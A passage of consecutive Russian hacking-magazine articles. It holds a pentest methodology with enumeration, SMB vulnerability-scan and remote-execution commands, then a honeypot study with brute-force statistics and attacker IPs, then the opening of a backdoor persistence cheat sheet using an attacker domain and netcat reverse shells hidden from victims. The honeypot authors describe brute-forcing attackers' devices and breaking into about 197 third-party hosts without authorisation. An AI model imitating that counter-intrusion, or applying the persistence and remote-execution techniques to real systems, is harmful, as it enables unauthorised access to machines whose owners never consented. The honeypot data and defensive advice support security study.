 • Уязвимость в ранних версиях SSH, поз волявшая перечислять локальных
   пользователей.
 • Несовпадение версий клиента и сервера, требующее специальных флагов
   для работы.
 • Раскрытие точ ной информа ции о версии и ОС сервера, поз воляющее
   производить дальнейшее исследова ние фай лов через path traversal.


80-й порт
Самый популярный и самый без гра ничный для исследования порт — именно
на нем живут все веб‐сервисы. Но мы пока не будем даже запускать браузер,
а методично проверим всю дос тупную информа цию!
   Тут нам уже не поможет nc. Но я все равно рекомендую вначале запустить
его.


$ nc ‐nv x.x.x.x 80

Вдруг это прячется SSH‐сервер на 80‐м порте. Дальше проверь заголовки
сервера:


$ curl ‐I x.x.x.x

Там наверняка может найтись тип сервера и его версия, версия PHP, если он
используется, и другая очень полезная информация.





                    Ин формация о сервере

Как видишь, на нашем примере сервер защища ет сервис защиты от DDOS‐
атак Qrator, а строка Link: <https://xakep.ru/wp‐json/>; rel=https://
api.w.org/ говорит нам, что сайт, скорее всего, работает на WordPress.
  Пришло время заглянуть в исходный код стра ницы! (Опция ‐L позволя ет
корректно обрабатывать редиректы сервера.)


$ curl ‐i ‐L x.x.x.x

Здесь ты можешь попрактиковаться в чтении HTML и поис ке с помощью grep
и регулярных выражений. Что следует искать и уметь определять?
 • Версию CMS и ее наз вание.
 • Шаблонизатор, на котором может быть пос троен сайт.
 • Лю бые комментарии и временно скрытые ссылки на другие сайты или раз‐
   делы.
 • Ссылки на другие поддомены (особен но акту аль но для HTB).
 • Версии подключаемых библиотек (иногда поз воляют косвенно опре делить
   версию CMS).

Теперь наконец запусти бра узер и пос мотри, нет ли чего инте ресного.
Это самая творческая часть, и тут как раз нужно банально набить руку. Читай
много райтапов и запоминай, что и как делают люди. Что нас может инте‐
ресовать здесь:
 • есть ли файлы robots.txt или sitemap.xml;
 • есть ли формы обратной свя зи или формы аутентификации;
 • есть ли закрытые разделы, варианты регистрации или восстановления
   пароля.

Поищи исходный код CMS в интернете. Очень часто на GitHub можно найти
нужную тебе CMS и понять, на какие файлы стоит обратить внимание (нап‐
ример, на конфиги), там же ты найдешь списки исправленных уяз вимос тей.
  Я использую очень удоб ный плагин для Firefox Wappalyzer. Он поз воляет
определять используемые фреймворки и другие особенности веб‐сервера.
  В целом список тут практичес ки бесконечный и тянет на большой месяч‐
ный курс или десяток статей.


        WWW

                    Обязательно посмотри вот на эти чек‐листы:
                   •Web enumeration
                          •Pentesting Web checklist

                    Но помни, что всегда лучше брать лучшее из них
                      и собирать свои, чтобы точно понимать, за что
                        отвечают каждый скрипт и коман да!


Ничего интересного не нашлось? Самое время взять словарь и попытаться
поискать файлы и скрытые директории. Тут можно использовать любые
любимые инструменты: nikto, Gobuster, DIRB.


$ gobuster dir ‐t 128 ‐u http://x.x.x.x/ ‐w /usr/share/seclists/
Discovery/Web‐Content/common.txt ‐s '200,204,301,302,307,403,500' ‐e

Скажу сразу: если ты видишь, что перебор займет часов пять или шесть, то,
вероятнее всего, это не тот путь, которым следует идти. Такое встречалось
мне в лабораторных машинах. Просто пометь себе, что этот вариант ты
не проверил, и иди дальше.
   Что интересного мне встречалось в веб‐сервисах?
 • SQL и командные инъекции.
 • Информация о датах рождения, поз волявшая подобрать пароль или отве‐
   тить на секретный вопрос в форме вос ста новления пароля.
 • XSS, позволяющая получить админские сес сии.
 • Ошибки настрой ки веб‐сервера.
 • Скрипты разработчика, которые вместе с path traversal позволяли найти
  файлы с паролями и скачать их.
 • И многое, многое другое.

Для XSS, обхода фильтра ции команд и других инъ екций я очень рекомендую
один из самых больших сборников полезных нагрузок.


Порты 139 и 445
Это известная тебе Samba. Для работы с ней существует множес тво инстру‐
ментов, я перечислю лишь некоторые из них.


$ enum4linux x.x.x.x

Так ты сможешь узнать имя хоста, его принадлежность к домену и рабочей
группе, доступные ресурсы, воз можные имена пользовате лей и многое дру‐
гое. Обязательно поэкспериментируй с этой утилитой.
  Получить список доступных папок можно такой командой:


$ smbclient ‐L //x.x.x.x ‐N

Если тебе нужно рекурсивно посмотреть все папки, то пиши


$ smbclient //HOST/PATH ‐c 'recurse;ls' PASS ‐U USER

Проверь наличие известных уяз вимостей в SMB с помощью Nmap. Eternal‐
Blue — все еще мощ ный инс трумент.


$ nmap ‐‐script smb‐vuln* ‐p139 ,445 ‐T4 ‐Pn 10.11.1.111

Вот как запустить удаленно команду с помощью SMB:


$ winexe ‐U username //10.11.1.111 "cmd.exe" –system

Советы здесь в целом похожи на советы из раздела о FTP. Выяс ни, какие
ресурсы тебе доступны, какие пользователи есть на сервере (могут при‐
годиться при переборе), нет ли полезной информации в дос тупных папках. И,
как всегда, внимательно читай райтапы, подсматривай используемые ути‐
литы, разбирайся в их работе и заноси в свою подборку. Обя зательно ста‐
райся выяснить, почему была использована одна утилита, а не другая.
  В моей персональной методике еще мно го описанных портов, но я не буду
перечислять их дальше, а прос то отправлю тебя в уже извес тный тебе
чек‐лист по портам.


ПОИСК УЯЗВИМОСТЕЙ
Теперь, когда у тебя есть список используемого ПО с версиями, самое время
поискать известные уязвимос ти и готовые экс пло иты. В лаборатории OSCP
тебе вряд ли придется писать собственные экс плоиты, чаще всего нужно мак‐
симум поправить готовые. А вот слож ные машины HTB вполне могут тре‐
бовать ручного написания экс плоита.
   Где же искать экспло иты? Помни, что не на все уязвимости есть готовые
эксплоиты и не все уязвимость поз воляют их написать. Поэтому стоит начать
с самой большой базы данных уязвимос тей cvedetails.com.
  Там есть поиск по вендору, программе, версиям и другим критериям. Мой
тебе совет: никогда не превращайся в скрипт‐кидди, который способен толь‐
ко запустить программу и ждать результата. Про читай CVE, пойми, почему та
или иная программа уяз вима. Если есть эксплоит, проверь, требует ли он
компиляции. Можешь ли ты его собрать. Будет ли он работать на твоей сис‐
теме. Какие у него есть начальные усло вия.
   Часто бывает, что есть целый перечень отличных экс плоитов, но они тре‐
буют админ ских прав в CMS или на сай те. В этом слу чае тебе нужно либо
найти данные админис тратора, либо искать дру гой вариант проникнуть
на машину. В лаборатории OSCP мне встретилась машина, на которой
не работал готовый экс пло ит повышения при вилегий, но стоило прочитать
CVE и просто заменить одно слово, как он сно ва был работоспособен!
   Где брать эксплоиты? Самая известная база экс плоитов — это, конечно,
exploit‐db.com и ее консоль ный вариант searchsploit. Размещенные там экс‐
плоиты достаточно безопасны для использования. Но никогда не ограничи‐
вайся ей. Поищи в Google «имя программы версия exploit». Очень часто мож‐
но найти интересные свежие экспло иты.


           WARNING

                    Никогда не запускай непроверенные эксплоиты
                       на своей машине! Всегда читай исходный код
                      и проверяй, что он не несет ничего вредоносного.
                       Всегда лучше собрать бинарник самому, чем ска‐
                         чать его непонятно где. Делай резервные копии
                      и снапшоты своей рабочей системы.


Несколько полезных советов о поиске экс плоитов и работе с ними.
 1. Научись в совер шенс тве вла деть searchsploit. Можешь потренироваться
   на сервере Apache: научись показывать только экс плоиты удаленного дос‐
   тупа, а не выполнения DOS‐атак, раздели выдачу по Apache  httpd
   от Apache Tomcat.
 2. Попробуй поискать экс плоиты на GitHub с помощью Google. Пой ми,
   как это лучше делать и как правиль но фильтровать результаты.
 3. Научись собирать экс плоиты не только под x86_64, но и под чистый i386.
   Иногда такое может очень пригодиться.
 4. Научись искать и исполь зовать экс плоиты в Metasploit.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Этот раздел вполне бы потянул на несколько ста тей, поэтому я просто дам
тебе ссылки на отличные статьи о получении root‐дос тупа и прав администра‐
тора в Windows.
  От себя добавлю нес колько полезных советов и трюков, встречавшихся
мне в разных ситуациях.
 • Инструменты linPEAS и подобные им полезны, но на экзаменационных
  машинах OSCP они не находят абсолютно ничего! Разберись, как они
   работают, и набросай себе список нужных команд вроде поис ка SUID.
 • Поставь и внимательно изу чи чистые Windows и  Linux. Тебе нужно
   понимать, какие сервисы есть в системе после установки, а какие туда
   могли добавить.
 • Увидел неизвестную тебе программу? Обязательно запиши! Очень часто
   через нее можно получить повышение привилегий.
 • Внимательно смотри на странности в папках sbin и bin. У меня однажды
   там лежал eximXX (явно ука зана версия в названии), хотя в спис ке уста‐
   новленных пакетов его не было. Конечно же, через него можно было
   получить рут.
 • Внимательно изучи дос тупные изнутри порты. Очень час то внутри на 127.
  0.0.1 есть уязвимый или пло хо настроенный сервис.

Из очень инте ресного я встречал в лабора ториях машину с Windows NT 4.0,
с доступом по VNC, где пароль админа был записан на обоях рабочего стола,
но был скрыт окном логина. Нужно было передвинуть окно входа в сис тему
и просто прочитать пароль «под ковриком».
   Ну и как всегда, заноси все найденные интересные решения в свою
методику. Лично для меня обычно сложнее получить доступ на машину, чем
повысить в ней привилегии. Видимо, сказывается большой опыт работы
архитектором и настройки раз ных серверов.


ПОСТЭКСПЛУАТАЦИЯ
Этот этап очень редко встречается в отдельных машинах HTB, но край не
важен в лабораториях. Впрочем, ты мог встретить такое, если проходил ввод‐
ные машины HTB.
   Что нужно обязательно сделать на этом этапе.
 1. Собрать все доступные хеши паролей. Это может быть mimikatz, файл
  /etc/shadow, настройки сервисов и баз данных. В общем, все пароли,
   до которых сможешь дотянуться.
 2. Просмотри все сетевые соединения. Иногда мож но увидеть интересное
  общение с другими серверами и найти пути вхо да на них.
 3. Просмотри всю доступную информа цию в базах данных. Там могут быть
   логины/пароли для дру гих серверов или интересные резервные копии.
 4. Собственно резервные копии. Не пренеб регай ими, и, возможно, най‐
  дешь что‐нибудь важное.
 5. Пользовательские папки. В них могут быть те же резервные копии, исто‐
   рия выполнения команд (нап ример, использования пароля для подклю‐
   чения к БД или другому серверу) и так далее.
 6. Не забудь о реестре Windows. Там могут быть пароли к VNC и другим
   похожим сервисам.

Обязательно документируй все находки. Очень час то у тебя есть информация
для доступа к новой машине, но ты не можешь найти ее. Встретил документ
или файл RDP с паролем к новому компьютеру в лаборатории — сделай
запись об этом! В OSCP повторное использование паролей — обычное дело.


ЧИСТКА СЛЕДОВ
Правило хорошего тона в любой лаборатории — очистка машины от своих
следов. Сюда входит уда ление любых эксплоитов, которые ты использовал,
возврат в первоначальное сос тояние машины в лаборатории OSCP, удаление
всех шеллов Metasploit. Кстати, в экзаменационном отчете OSCP этому пос‐
вящен отдельный раздел.


ВЫВОДЫ
Вывод у меня очень прос той. Если ты хочешь стать хорошим пентестером,
введи системность в свои действия. Изу чай операционные системы, сети,
постоянно читай новые материалы и пополняй свои чек‐листы и списки тех‐
ник. В результате всего это го у тебя вырабо тает ся опре деленное чутье
и понимание, на что же стоит обратить внимание при исследовании очеред‐
ной машины. Если соберешь ся сда вать экзамен, это вдвойне пригодится.
Нередки случаи, когда сдающий прос то забывал проверить содержимое
robots.txt из‐за стресса и не брал в итоге машину. Хороший собственный
чек‐лист позволяет снизить стресс и действовать более эффективно.
  Помни, направление пен теста постоянно развива ется и появляются новые
интересные инструменты и техники. Не упус ти их!
ВЗЛОМ

ЭТО
ЛОВУШКА!
КАК МЫ РАССТАВЛЯЛИ
ХАНИПОТЫ И КТО В НИХ
ПОПАЛСЯ





    Михаил Артюхин
    localhostt412@mail.ru





        Hackcat
   hackcat.dev@gmail.com





Если ты хоть раз админил сервер, то точно знаешь: авто‐
ризацию по паролю нужно отключить или серьезно огра‐
ничить — белым списком, VPN‐шлюзом или еще как‐то. Мы
решили проверить, что будет, если это го не сделать, и сей‐
час покажем, что получится.


           WARNING

                      Вся информация предоставлена исключительно
                        в  ознакомительных  целях.  Автор и  редакция
                      не несут ответственности за любой возможный
                        вред, причинен ный с использованием сведений
                       из этой статьи.


Встать под атаку и пос мотреть, что будет, — это лучший способ изучить,
как работают хакеры. Это мы и сделали — купили несколько серверов в раз‐
ных подсетях и засели в засаде. Первый же неос торожный бот попался все го
через семь секунд, а мень ше чем через сутки мы засекли больше 12 тысяч
гостей на одном толь ко SSH. Немудрено, что рано или поздно учетные дан‐
ные ко многим серверам подбира ются, сами серверы продолжают черное
дело своих создателей, а в сво бодное время час тенько копают биткойны.
  Мы рассмотрим атаки по нес кольким протоко лам: SSH — как наиболее
популярный, Telnet, распространенный в мире IoT, и FTP, куда ломятся, чтобы
залить шелл для дальнейшей атаки или заразить исполня емые файлы.
На один только SSH за время теста к нам пос тучались 986 437 раз.


Для чего используют чужие машины
Со взломанного «умного» устройства можно атаковать остальную сеть, про‐
водить DDoS, майнить криптовалюты, слать спам и заниматься более изощ‐
ренными вещами вроде DNS poisoning или перехвата трафика.
   Часто злоумышленники поднимают на захваченных машинах прокси‐сер‐
веры. Это ходовой в теневой части интернета товар, даже при беглом поис ке
мы нашли несколько десятков предложений. При этом обычно прокси про‐
даются по подписке, а не разово.
  Средний ценник за 100 штук — порядка 25 долларов, но рос сийские прок‐
си ценятся куда дешевле — око ло 12 долларов. За элитные прокси в одни
руки хотят по 3‐4 доллара за  IP, при этом рас ходятся они все равно
как горячие пирожки. Видимо, для постоянных клиентов предусмотре ны скид‐
ки, не заявленные публично.



ПОДГОТОВКА
Мы установили ханипо ты на два сервера. Первый изначально для этого
исследования не предназначался, так что часть ста тистики с него не включает
пароли. На втором сервере сра зу были ханипоты.
  В какой‐то момент стандартный SSH мы перенес ли на порт 404 («404 SSH
Service Not Found», ага) на обо их серверах, а штатный 22‐й порт занял
ханипот. Но ни один бот его после этого не нашел. Как видишь, заезженная
рекомендация переносить SSH на неожи данные порты имеет смысл, особен‐
но когда 22‐й порт открыт, но не пода ет виду, что нужный сервис есть где‐то
еще.
  Выборка в итоге получилась небольшая, поэтому мы расширили статис‐
тику, проанализировав логи со взло манных ботов.


ГДЕ БРАТЬ ХАНИПОТЫ
Вот сами ханипоты, которые мы использовали для разных протоколов. Естес‐
твенно, существует мно жес тво других решений, в том числе коммерческих,
но их перечисление и сравнение — тема для отдельной статьи.


telnetlogger
 • robertdavidgraham/telnetlogger

Простой Telnet‐логгер, в лог пишет прос то пары логин‐пароль. IP‐адре са
тоже записываются, но в соседний файл и без свя зи с конкретной парой
логин‐пароль, что неудоб но. Завелся сразу и лишних настроек не тре бует.


SSH Honeypot
 • droberson/ssh‐honeypot

Записывает в лог IP, логин и пароль. Каж дая запись помечается вре менной
меткой, чего в Telnet‐логгере нет. Информацию о вре мени можно исполь‐
зовать, чтобы строить продвинутые графики, вроде зависимости интенсив‐
ности атак от времени суток или дня недели, но делать это мы не будем —
нас в данном случае интересует сам факт атаки и используемые техники.
  Первые попытки перебо ра появились уже через семь секунд после акти‐
вации ханипота.



  [Sun Jan 10 22:40:41 2021] ssh‐honeypot 0.1.0 by Daniel Roberson started
  on port 22. PID 4010913
  [Sun Jan 10 22:40:49 2021] 196.*.*.166 supervisor qwer1234
  [Sun Jan 10 22:41:16 2021] 59.*.*.186 vyatta 123
  [Sun Jan 10 22:41:38 2021] 207.*.*.45 root muiemulta



honeypot-ftp
 • alexbredo/honeypot‐ftp

Этим протоколом интересовались меньше всего. Воз можно, это связано
с тем, что ханипот для FTP на популярных языках нам найти не удалось, так что
использовали что нашли. Этот ханипот даже при не очень детальном рас‐
смотрении «светит» тем, что написан на Twisted и тем самым отпугивает
некоторые ботнеты и не самых тупых ата кующих.





                   Сканирование ханипота Nmap


SSH
Для сбора статистики мы использовали два раз ных способа. Первый — ана‐
лиз логов sshd. Туда попадают в том числе попытки неудачной авторизации,
которые мы вытащили вместе с информа цией об использованных логинах
и IP атакующих. Для расширения статистики мы решили использовать сер‐
веры, которые напрямую не предназначались для этого исследования, но их
владельцы любезно предос тавили нам выгрузку записей journald, которую
мы тоже проанализировали в этом блоке.
   Второй способ — непос редс твенно анализ логов ханипотов. Тут в анализ
попали также и пароли, с которыми приходили атакующие. Эта статис тика
не столь обширна, но зато максимально точна.
  Самый частый логин ожидаемо — root. В логах ханипотов он встретился
в общей сложности 85 563 раза — свыше чем на порядок больше второго
места (oracle — 7832).
  По  версии  sshd,  отрыв  «рута»  от  всех  остальных еще  больше:
408 778 попыток логина под рутом против 321 467 всех остальных (55,9%
вообще всех попыток логина). Вто рой по популярности логин в списке даже
не пытается кон курировать с «рутом». Логин admin набрал всего 15 331 сра‐
батывание, что в 26,7 раза мень ше почет ного первого мес та. На третьем
месте расположился test, набравший еще вполови ну меньше детектов —
всего 8624.
   Вот рейтинг самых популярных логинов. Первые две колонки — по логам
sshd, последние — по ханипо там.





Звездочками я замазал IP тес товых серверов. Видимо, некоторые особо ода‐
ренные боты считают, что админ мог поставить в качестве логина IP‐адрес
самого сервера. Кстати, залогиниться с IP вмес то логина попробовало все го
несколько ботов, но они оказались очень нас той чивыми и поэтому вывели эти
логины в топ.
  Из интересных логинов в журналах ханипотов также отметились ubnt
(видимо, сокращение от «ubuntu», 1001 слу чай), web  (897), demo (885),
MikroTik (795), pi (стандартный поль зователь на Raspberry Pi, 770), teleco‐
madmin (штатный логин на мно гих роутерах, 748), minecraft (293), baikal
(292), dev (173), ts (166), odoo (158), vbox (154), sinusbot (120), csgoserver
(100), mcserver (80), hacker (45), cactiuser (45), xxx (28), miner (17) и ter‐
raria (14).
  Была еще 51 попытка зайти с пус тым паролем. То есть боты атакуют игро‐
вые серверы (Minecraft, CS:GO и Terraria — это игры, и вариантов логинов
с ними было достаточ но), роутеры (telecomadmin — классика для роуте ров
Huawei и других), ну и просто пробуют логины наугад.
  В логах sshd также отметились уже зна комые нам ubnt (1558), demo (1370),
pi (1312), web (1129), minecraft (1006), MikroTik (661), sinusbot (433), ну
и прочие (huawei, linux, nvidia — кто вооб ще так юзеров называет?).
   Какой‐то осо бенно дикий бот пытался бру тить со списком паролей
в качестве логинов. Полюбуйся!



  1 !234QwerAsdf
  1 !@#!@#!@#!
  1 !@#$%
  1 !@#$%QWERT
  1 !@#$%^

          &*()_+  1 !@#$%

          &*()_+|  1 !@#$%

          qwer  1 !@#$%
  1 !@#$%qwert\r
  1 !@#$qwer
  1 !@#123$%^
  1 !@#1234
  1 !@#123qwas
  1 !@#321Qwe
  1 !@#456qweASD
  1 !@#QWE123QWE
  1 !@#abc123
  1 !@#edc!@#
  1 !@#qwe$%^
  1 !@#wsx!@#
  1 !Passw0rd!
  1 !Password@
  1 !Q#E@W$R
  1 !QA2ws3ed
  1 !QAZ
  1 !QAZ1231xsw
  1 !QAZ2wsx\r
  1 !QAZ@WSX3EDC
  1 !QAZWSX0a
  1 !QAZX(OL<M
  1 !QAZXSW@#EDC!@#
  1 !QAZxsw2#EDCvfr4%TGBnhy6
  1 !QAZzaq1@WSX
  1 !QAz@WSx#EDcRFv
  1 !QWASZX1
  1 !Qaz
  1 !Qaz!Qaz
  1 !password!
  ...


На ханипотах мы зафиксировали 4981 уни каль ный логин, в логах sshd —
30 036 уникальных.
   Теперь к паролям. По уже упомяну тым причинам мы не можем анализи‐
ровать пароли для всех атак (которых почти миллион). Так что имей в виду, что
рассмотренные ниже пароли получены со сравнитель но небольшой выборки
в примерно 200 тысяч попыток.
   Лучшим паролем года признается root с 19 600 обнаружений. А священ‐
ный 123456 расположился на втором мес те с 7284 попытками исполь‐
зования. Ниже привожу список лучших (самых популярных) паролей для тво‐
его сервера:



   2966 J5cmmu=Kyf0‐br8CsW
   3306 11111
   3528 qwerty
   3943 12345
   4272 1234
   4501 test
   4704 123
   4924 admin
   7284 123456
  19600 root


Из всех них вопросы вызывает только «J5cmmu...». Мне не удалось опре‐
делить, чей это стандартный пароль, а гуглеж при вел только к более старым
результатам подоб ных исследова ний и подтверждениям того, что мы не одни
заинтересовались этой мистерией.
  В топ‐100 вошел также password (13‐е место из 2479 детектов), 12345678
(18 из 1053), pi (38 из 431) и paspberry (39 из 424), hlL0mlNAabiR
(49 из 305), telecomadmin (65 из 220) и changeme (84 из 106). В остальном
ничего особенного, кро ме 2262 попыток логина с пус тым паролем.
  Всего в атаках замечены 33 306 уникальных паролей.


Пара слов о самих атакующих
Конечно, мы не могли не пос мотреть, кто именно нас атаковал. С одного
из ханипотов были сняты все записанные адреса, а инструмент с GitHub пос‐
троил красивую карту.





Также мы посчитали ста тистику, с каких адресов было больше всего атак.
Топ‐5 самых настой чивых ботов сейчас перед тобой:


 8354 211.114.134.118
 11096 121.169.34.14
 15474 20.184.15.72
 24492 202.103.176.67
 42512 222.186.10.114


Адреса героев специально не замазываю, чтобы ты внес их в черный список
на своем файрволе.
   8162 уникальных адреса сделали не меньше десяти попыток логина каж‐
дый, всего 1564 сделали не меньше сот ни попыток, а больше 500 раз поп‐
робовали войти всего 97 разных ботов! Тем не менее около половины всех
попыток сде лали боты, набравшие от ста попыток, то есть львиную долю всех
атак делают боты, которые подолгу на одной цели не задерживаются и уходят
после максимум пары десятков  попыток. Но  из‐за уникумов, которые
без устали ломятся на один и тот же сервер, среднее чис ло попыток на ата‐
кующего составило 51,7.


Итого мы заметили много стандартных паролей к разной технике, модифи‐
каций логинов, да и откровенно простых паролей тоже. Похоже, ботоводы
почти уверены: если про являть нас тойчивость, сервер когда‐нибудь да сог‐
ласится, что его пароль — root. Попыток экс плуатации уязвимостей было
немного — несколь ко десятков. Увы, в силу несовершенс тва ханипотов мы
не смогли узнать, какие именно уязвимос ти пытались эксплуатировать.


        WWW

                   В ходе написания этой статьи мы наткнулись
                       на аналогичное иссле дование. Часть данных там
                        отличается, но общий тренд все равно заметен.
                    А еще авторы посчитали статистические законо‐
                    мерности между днями недели и количеством
                           атак.



TELNET
Главный логин, к которому многие боты пытались подобрать пароль, конечно,
root, замеченный 53 084 раза. Следом идет admin, попавшийся 22 021 раз,
и sh, использованный 16 790 раз. Четвертое и пятое место заняли lin‐
uxshell и enable, набравшие 16 790 и 16 677 детектов соответственно.
В десятку самых популярных вошли также system (6‐е место, 10 509 обна‐
ружений), shell (9316) и guest (5037). На 11‐м мес те расположился support
(3780), который я ожидал увидеть в этом списке несколько выше.
  В списке логинов попадались интерес ные экземпляры:



   14 \x17\x12\x1b\x1f\x18\x1f\x05\x02\x04
   20 \x05\x03
   20 \x27::!
   20 \x2c>.8?K
   32 cuadmin
   32 ncorrect
   33 db2fenc1
   44 \x16\x03
   44 diag
   48 */&\x22%K
   68 &;;\x20
   69 cisco
   71 \x04
   84 9$$?K
  101 jnior
  130 Alphanetworks
  176 dnsekakf2$$
  215 TMAR#DLKT20060205


Остается только гадать, кто мог бы поставить подобные логины. Но поиск
последне го логина выдал интерес ный  сайт. Похоже,  логин TMAR#DLK‐
T20060205 принадлежит роутеру D‐Link 500B, который, видимо, и атакует
обнаруженный бот. Всего мы увидели 297 уникаль ных логинов.
   Что  касается  распределения  количес тва  атак  по  IP‐адре сам,  то
из 186 454 атак на Telnet 14 128 (7,6%) сделал один и тот же IP. Было зафик‐
сировано 8006 уникальных ата кующих, то есть в среднем было 23,2 попытки
логина с каждого IP.
  Пароли попадались не менее уникальные, чем логины. Смотри:



     1 `\x22=\x1a\x3c8g!>‐/!
     1 rasberrypie


  3 4\xc6\x1eU\xae\x9a\xf4\xa3Y_m&:\xe7\x0fr\xd7x\x80\xf5\x01\xbc;\xce\x04
     8
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    11 wapnd15_dlob_dap1522b
    12 5:\x20\x278%
    12 7ujMko0root
    12 8>;;$9?K
    12 Uq‐4GIt3M
    14 0p3nm35h
    14 D13HH[
    14 P@55w0rd!
   131 hacktheworld1337
   170 Win1doW$
  1406 t0talc0ntr0l4!
  2421 S2fGqNFs
  2521 OxhlwSG8


Приятно видеть, как какой‐то бот стал орать от безысходности. Не станем ему
мешать.
  Всего было 699 уникальных паролей. Вот топ‐10 — выбирай на свой вкус
(точнее, не делай это го ни в коем случае).



   4066 12345
   4231 default
   4825 start‐shell
   4829 development
   5158 admin
   5448 /bin/busybox\x20KURC
   9190 /bin/busybox\x20LMAO
   9650 runshellcmd
  15505 linuxshell
  16801 shell


Тут мы видим упомина ние busybox,  так  что, воз можно, какие‐то боты
пытались сразу слать команды вместо ввода логина и пароля. То есть охот‐
ники на незакрытые коробки даже не удосуживаются проверить, запрошена
ли авторизация.
  Вывод в случае с Telnet прост: каким бы надежным ни казал ся заводской
пароль, лучше его сменить. Серьезно.


FTP





                          Лог FTP ханипота

Можно понять, что на FTP проводят в основном целевые атаки, а мас совое
сканирование ищет только серверы с дефолтны ми учетными данными, ну
или полностью отсутству ющей авториза цией. Ничего примечательного мы
здесь не нашли: немного попыток входа без пароля, немного анонимных;
никаких попыток продолжительного брут форса или эксплоитов в логах тоже
нет.
  Вывод: FTP находится под мень шей угрозой, чем тот же Telnet или даже
SSH. Впрочем, это не повод забить на его защиту.


ИДЕМ В КОНТРАТАКУ
Выделив все уникальные IP‐адреса атакующих и соз дав словарь из логинов
и паролей самих ботов, мы во имя утоления вселенского любопытства поп‐
робовали применить брутфорс к самим атакующим их же словарем.


        WWW

                    Использовалась  священная  THC‐Hydra,  B0n3t‐
                         Brute, BruteDum и cbrutekrag.


Что удивительно, на ответную ата ку поддалось не так уж много устрой ств.
Возможно, это связано с тем, что атакова ли мы только тех, кто попался
на ханипот, а адреса из логов sshd, которых было куда больше, мы не про‐
веряли. В любом случае, это было сделано исклю чительно для проверки
гипотезы, что атакующие были заражены в автоматическом режиме.
  Обнаружились несколько IP‐камер, парочка роутеров и прочей умной тех‐
ники. Вручную все находки мы не проверя ли из‐за нехватки времени.
  Нашелся хост с pfSense; как гла сит главная страница этой софтины,
это «опенсорсный файрволл, которому доверя ет весь мир». Что ж, админов,
которые ставят пароль admin, это не спа сает.





                               pfSense

Следующий сервер оказался VPN‐шлюзом.



Сразу по названию процесса понятно, для чего нужен этот бот: майнинг
Monero.





                      Процес сы на хосте

На контратаку по SSH поддалось 197 адресов из 1779 (11%). С одной сто‐
роны, немного. С другой — каждый десятый ата кующий оказал ся с настолько
слабой защитой, что взло мать его не сос тавило никаких проблем, и это чис ло
могло быть выше, если бы мы использовали больший словарь.
  Значительная часть атакующих относится к Internet of Things, скорее всего
зараженных при помощи перебо ра пароля. Как Дмитрий Белявский однажды
иронично отметил, «буква S в аббревиату ре IoT обоз начает Security».


ВЫВОДЫ
Мы рассмотрели всего нес колько протоколов, которые могли заинтересовать
хакеров, и, конечно, наше исследование не может считаться особенно пол‐
ным. За бортом, к примеру, остались машины на Windows, которых тоже
немало.
  Печально, что советы, извес тные еще с двухтысячных годов, актуальны
и по сей день: закрывать порты, переносить критичес кие сервисы на нес‐
тандартные порты, ставить слож ные неб рутабельные пароли или же вовсе
отключать авторизацию по паролю.
   Как видишь, всего за пару месяцев количество атак зашкалило. Если ты
оставишь небезопасный пароль надолго, то его в какой‐то момент под берут.
Конечно, во многих умных гаджетах пароль зашит разработчиком, но в таком
случае порт устрой ства не должен светиться наружу.
   Также небесполезно иметь свой ханипот, чтобы видеть угрозы и даже
автоматически отво дить часть из них.
ВЗЛОМ
ШПАРГАЛКА ПО
 PERSISTENCE

      КАК НАДЕЖНО ПРОПИСАТЬСЯ
       НА ХОСТЕ ИЛИ ВЫЯВИТЬ
        ФАКТ КОМПРОМЕТАЦИИ





Когда получен шелл на хосте, первое, что
необходимо сделать, — это обеспечить
себе «пос тоянс тво» (persistence) в системе.
Ведь во многих случаях на RCE может быть
лишь одна попытка, а зна чит, недопустимо               s0i37                                                                             Ведущий аналитик УЦСБ.
потерять дос туп из‐за каких‐нибудь досад‐              s0i37@ya.ru
ных обстоятельств.


Есть разные способы организовать воз можность постоянного присутствия,
у каждого свои достоинства и недос татки:
 • записать что‐либо на HDD:
    • плюс: переживет перезагрузку;
    • минусы: заметно для человека, заметно для антивиру са;
 • внедрить код в RAM:
    • плюс: незаметно для человека;
    • минусы: не переживет перезагрузку, может быть заметно для антивиру‐
      са;
 • изменить кон фигурацию ОС:
    • плюсы: незаметно для антивируса, переживет перезагрузку;
    • минус: может быть замет но для человека.

Чаще всего при закреплении в системе все же приходится обращаться к дис‐
ку, поскольку это единственный способ не вылететь из‐за случайной перезаг‐
рузки. В общем случае успешность такой персистентности зависит от двух
факторов:
 • насколько скрытно от поль зователя прописан запуск бэкдора;
 • насколько безобидно для антивируса тело бэкдора.

Очевидно, что с точки зрения закрепления Linux — более приоритетная сис‐
тема. Компьютеры с ним, как правило, редко обслу живаются пользовате лями
и не перезагружаются месяца ми. Да и как точка опоры они подходят больше.
Хосты под управлением Linux удобны еще и потому, что они редко защищены
антивирусом, а антивирус для персистентнос ти — это ощутимая проблема.
  В свою оче редь, в Windows больше вари антов автозагрузки, что может
помочь лучше замаскироваться в ее недрах. Ведь, в отличие от проник‐
новения в Linux, нам почти всегда придет ся работать рядом с пользователем,
опытным или не очень.
   Когда име ешь дело не с одной целью, а с целой группой, весьма удобно
использовать для машины ата кующего доменное имя, а не IP. Тогда для каж‐
дой жертвы или группы жертв мож но будет задать свое уникальное имя
в DNS‐зоне атакующего (далее в примерах — attacker.tk). Это позволя ет
эффективнее управлять жертва ми. Выглядит это примерно так.





Если антивирусы не главная проблема, то в качестве reverse shell часто можно
использовать простые nc.exe, ncat.exe и socat.exe. Все они обладают воз‐
можностями RAT и зачастую нормально проходят анти вирус. Поскольку
это программы, работающие из командной строки, можно сделать их запуск
на машине жертвы незаметным. В Windows для этого достаточно поменять
subsystem у исполняемо го файла:


pe header → optional header nt fields → subsystem → GUI (0x0002)

Описанные далее примеры помогут не только при закреплении на машине
жертвы, но и для выявления фактов компромета ции.
   Анализ элементов автозагрузки — это часто поиск иголки в стоге сена.
Обычно приходится судить по наз ванию исполня емого файла, тому, где он
находится (в правильных местах или где‐то в профиле пользователя), а также
